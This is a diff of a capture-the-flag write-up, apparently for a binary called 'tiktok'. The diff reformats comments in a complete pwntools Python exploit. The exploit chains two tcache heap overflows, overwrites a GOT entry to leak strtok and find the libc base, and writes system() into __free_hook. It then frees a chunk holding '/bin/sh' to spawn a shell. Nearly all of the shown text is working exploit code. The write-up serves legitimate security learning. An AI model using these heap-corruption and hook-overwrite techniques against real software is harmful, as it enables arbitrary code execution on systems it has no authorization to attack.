@@ -612,7 +612,6 @@ Once we do that all we need is a heap chunk that starts with the memory "//bin/s
 # Exploit
 
 ```python
-
 from pwn import *
 
 p = process(["./tiktok"])
@@ -705,28 +704,20 @@ remove_song("34") # L (overwritten by K)
 """ First Heap Overflow """
 
 play_song("44") # Reads from STDIN
-#Get A from tcache
-p.sendline("-1") # size of "lyrics"
+p.sendline("-1") # Size of "lyrics", gets A from tcache
 chunkA = p64(0x00) * 2 # Fills chunk A nullbytes
-# Overwrites chunk B tcache ptr w/ addr of song[0].fd
-chunkB = p64(0x00) + p64(0x21) + p64(0x404078) + p64(0x00)
-# Overwrites chunk Z data w/ ""//bin/sh"" and null bytes
-chunkZ = p64(0x00) + p64(0x20) + b"//bin/sh" + p64(0x00)
-# Overwrites chunk C tcache ptr w/ addr of song[1].lyrics_ptr
-chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) 
-# Sends payload
-p.send(chunkA + chunkB + chunkZ + chunkC)
+chunkB = p64(0x00) + p64(0x21) + p64(0x404078) + p64(0x00) # Overwrites chunk B tcache ptr w/ addr of song[0].fd
+chunkZ = p64(0x00) + p64(0x20) + b"//bin/sh" + p64(0x00) # Overwrites chunk Z data w/ ""//bin/sh"" and null bytes
+chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) # Overwrites chunk C tcache ptr w/ addr of song[1].lyrics_ptr
+p.send(chunkA + chunkB + chunkZ + chunkC) # Sends payload
 
 # tcache bin 0x20  -> B -> 0x404078 (songs[0].fd)
 # tcache bin 0x310 -> C -> 0x404080 (songs[1])
 # tcache bin 0x3c0 -> L -> I -> G
 
-# Remove chunks from 0x20 tcache bin
-play_song("17") # Removes B
-play_song("18") # Removes 0x404078 and memsets songs[0].fd to 0 
-
-# Remove chunk C from 0x310 tcache bin
-play_song("27")
+play_song("17") # Removes B from 0x20 bin
+play_song("18") # Removes 0x404078 from 0x20 bin and memsets songs[0].fd to 0 
+play_song("27") # Remove chunk C from 0x310 bin
 
 # tcache bin 0x20  -> corrupted 
 # tcache bin 0x310 -> C -> 0x404c8 (songs[1].lyrics_ptr)
@@ -735,15 +726,10 @@ play_song("27")
 """ Write To Songs Array """
 
 play_song("1") # Read from STDIN, songs[0] = song #1
-# Get 0x04040b0 from tcache
-p.sendline("767") # Give lyrics "size" of 767 (will be given a 0x310 chunk)
-# addr of .got:strtok_ptr
-strtok_got_addr = p64(0x403fc8)
-# Create fake song data for songs #3 and #4
-# song     = name       + fd     + dirnameptr    + nameptr + lyricsptr
-fake_song = p64(0) * 3 + p64(0) + p64(0x404098) + p64(0)  + p64(0)
-# Send payload 
-p.send(strtok_got_addr + fake_song * 2)
+p.sendline("767") # Give lyrics "size" of 767 (will be given a 0x310 chunk), get 0x04040b0 from tcache
+strtok_got_addr = p64(0x403fc8) # addr of .got:strtok_ptr
+fake_song = p64(0) * 3 + p64(0) + p64(0x404098) + p64(0)  + p64(0) # song = name + fd + dirnameptr + nameptr + lyricsptr
+p.send(strtok_got_addr + fake_song * 2) # Create fake song data for songs #3 and #4 and send payload w/ strtok addr
 
 # tcache bin 0x20  -> corrupted 
 # tcache bin 0x310 -> corrupted
@@ -752,15 +738,13 @@ p.send(strtok_got_addr + fake_song * 2)
 """ Get libc Address """
 
 play_song("2") # Trigger leak of strtok addr (no heap operation)
-# Parse out address leak
-strtok = u64(p.readuntil("So").split(b"\n")[-2] + b'\x00\x00')
+strtok = u64(p.readuntil("So").split(b"\n")[-2] + b'\x00\x00') # Parse out address leak
 libc = ELF('./libc-2.27.so') # Load our libc
-# Subtract strtok's offset from libc base from the absolute strtok 
-# address we leaked to set the libc base address
-libc.address = strtok - libc.symbols['strtok'] 
-# Get the absolute addresses for __free_hook and system
-free_hook = libc.symbols['__free_hook'] 
+libc.address = strtok - libc.symbols['strtok'] # Subtract strtok's offset from libc base from the absolute strtok address we leaked to set the libc base address
+free_hook = libc.symbols['__free_hook'] # Get the absolute addresses for __free_hook and system
 system_addr = libc.symbols['system']
+
+""" Second Heap Overflow """
 
 # Refill the tcache bin for 0x20
 remove_song("36") # H
@@ -771,36 +755,27 @@ remove_song("38") # K (overflows in L)
 # tcache bin 0x310 -> corrupted
 # tcache bin 0x3c0 -> L -> I -> G
 
-""" Second Heap Overflow """
-
-# Reads from STDIN
-play_song("3") 
-# Get chunk K from tcache
-p.sendline("-1")
-# Fill chunk K nullbytes
-chunkK = p64(0x00) * 2
-# Overwrite tcache next ptr in chunk L with __free_hook addr
-chunkL = p64(0x00) * 1 + p64(0x3c1) + p64(free_hook) + p64(0x00)
-# Send payload 
-p.send(chunkK + chunkL)
+play_song("3") # Reads from STDIN
+p.sendline("-1") # Get chunk K from tcache
+chunkK = p64(0x00) * 2 # Fill chunk K nullbytes
+chunkL = p64(0x00) * 1 + p64(0x3c1) + p64(free_hook) + p64(0x00) # Overwrite tcache next ptr in chunk L with __free_hook addr
+p.send(chunkK + chunkL) # Send payload 
 
 # tcache bin 0x20  -> J -> H
 # tcache bin 0x310 -> corrupted
 # tcache bin 0x3c0 -> L -> __free_hook
 
-# Remove L from 0x3c0 tcache bin
-play_song("35")
+play_song("35") # Remove L from 0x3c0 tcache bin
 
 """ Write to free hook """
+
 play_song("4") # Read from STDIN
 p.sendline("946") # Get __free_hook from tcache
 p.send(p64(system_addr)) # Overwrite with addr of system
 
-# Call free() a.k.a. system() on song 19, which contains "/bin/sh"
-remove_song("19")
+remove_song("19") # Call free() a.k.a. system() on song 19, which contains "/bin/sh"
 
-# SHELL!
-p.interactive()
+p.interactive() # SHELL!
 ```
 # Resources
 
